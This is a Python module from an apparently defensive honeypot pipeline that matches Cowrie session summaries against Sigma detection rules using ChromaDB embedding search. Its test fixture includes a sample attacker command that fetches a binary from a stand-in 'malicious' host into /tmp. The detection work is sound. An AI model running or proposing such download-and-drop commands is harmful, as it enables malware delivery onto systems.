import os
from pathlib import Path

import chromadb
from chromadb.utils.embedding_functions import OpenAIEmbeddingFunction
from load_dotenv import load_dotenv

load_dotenv()


def get_sigma_collection(chroma_path="./data/chroma/sigma"):
    chroma_path = Path(chroma_path)

    api_key = os.getenv("OPENAI_API_KEY")
    if not api_key:
        raise RuntimeError("OPENAI_API_KEY environment variable is not set")

    client = chromadb.PersistentClient(path=str(chroma_path))

    embed_fn = OpenAIEmbeddingFunction(
        api_key=api_key,
        model_name="text-embedding-3-small",
    )

    collection = client.get_or_create_collection(
        name="sigma_rules",
        embedding_function=embed_fn,
    )
    return collection


def build_sigma_query_text(session_summary: dict) -> str:
    """
    Safe similarity-search query builder for Sigma lookup.
    Mirrors MITRE version to keep embedding behaviour aligned.
    """

    MAX_SUMMARY_CHARS = 1500
    MAX_COMMANDS = 10
    MAX_URLS = 10
    MAX_SIGNATURES = 10

    parts = []

    # Summary (truncate)
    summary = session_summary.get("summary", "")
    parts.append(summary[:MAX_SUMMARY_CHARS])

    # Attack intent
    intent = session_summary.get("attack_intent")
    if intent:
        parts.append(f"Attack intent: {intent}")

    indicators = session_summary.get("key_indicators", {})

    # IPs
    src_ip = indicators.get("src_ip")
    if src_ip:
        parts.append(f"Source IP: {src_ip}")

    dest_ip = indicators.get("dest_ip")
    if dest_ip:
        parts.append(f"Destination IP: {dest_ip}")

    # Ports
    src_ports = indicators.get("src_ports", [])
    dest_ports = indicators.get("dest_ports", [])
    if src_ports:
        parts.append("Source ports: " + ", ".join(map(str, src_ports)))
    if dest_ports:
        parts.append("Destination ports: " + ", ".join(map(str, dest_ports)))

    # Protocols
    protocols = indicators.get("protocols", [])
    if protocols:
        parts.append("Protocols: " + ", ".join(protocols))

    # Commands – truncated
    for cmd in indicators.get("commands", [])[:MAX_COMMANDS]:
        parts.append(f"Command: {cmd}")

    # URLs – truncated
    for url in indicators.get("urls", [])[:MAX_URLS]:
        parts.append(f"URL: {url}")

    # Suricata signatures – truncated
    for sig in indicators.get("signatures", [])[:MAX_SIGNATURES]:
        parts.append(f"Signature: {sig}")

    # Files
    for f in indicators.get("files", []):
        parts.append(f"File: {f}")

    # Timestamp range
    ts = session_summary.get("timestamp_range", {})
    start_ts = ts.get("start")
    end_ts = ts.get("end")
    if start_ts or end_ts:
        parts.append(f"Time range: {start_ts} → {end_ts}")

    if not parts:
        return "Empty session summary"

    return "\n".join(parts)



def query_sigma_for_session(session_summary, top_k=5, chroma_path="./data/chroma/sigma"):
    collection = get_sigma_collection(chroma_path=chroma_path)
    query_text = build_sigma_query_text(session_summary)

    result = collection.query(
        query_texts=[query_text],
        n_results=top_k,
    )

    ids_list = result.get("ids", [[]])[0]
    metas_list = result.get("metadatas", [[]])[0]
    distances_list = result.get("distances", [[]])[0]

    matches = []
    for i in range(len(ids_list)):
        meta = metas_list[i] or {}
        distance = distances_list[i] if i < len(distances_list) else None

        matches.append({
            "sid": meta.get("sid"),
            "title": meta.get("title"),
            "logsource_product": meta.get("logsource_product"),
            "logsource_service": meta.get("logsource_service"),
            "level": meta.get("level"),
            "mitre_techniques": meta.get("mitre_techniques"),
            "raw_tags": meta.get("raw_tags"),
            "distance": distance,
        })

    return matches


def enrich_session_with_sigma(session_summary, top_k=5, chroma_path="./data/chroma/sigma"):
    sigma_candidates = query_sigma_for_session(
        session_summary,
        top_k=top_k,
        chroma_path=chroma_path,
    )
    session_summary["sigma_candidates"] = sigma_candidates
    return session_summary


if __name__ == "__main__":
    test = {
        "session_id": "x",
        "sensor": "Cowrie",
        "attack_intent": "malware_drop",
        "summary": "Attacker downloaded a suspicious ELF binary via wget.",
        "key_indicators": {
            "src_ip": "1.2.3.4",
            "dest_ip": "10.20.20.10",
            "src_ports": [44444],
            "dest_ports": [22],
            "protocols": ["ssh"],
            "commands": ["wget http://malicious/file.bin -O /tmp/x"],
            "urls": ["http://malicious/file.bin"],
            "signatures": [],
            "files": ["/tmp/x"],
        },
        "confidence": 0.9,
        "risk_score": 7,
        "timestamp_range": {"start": "2025-09-01", "end": "2025-09-01"}
    }

    enriched = enrich_session_with_sigma(test, top_k=5)
    print("Sigma candidates:")
    for c in enriched.get("sigma_candidates", []):
        print(c)
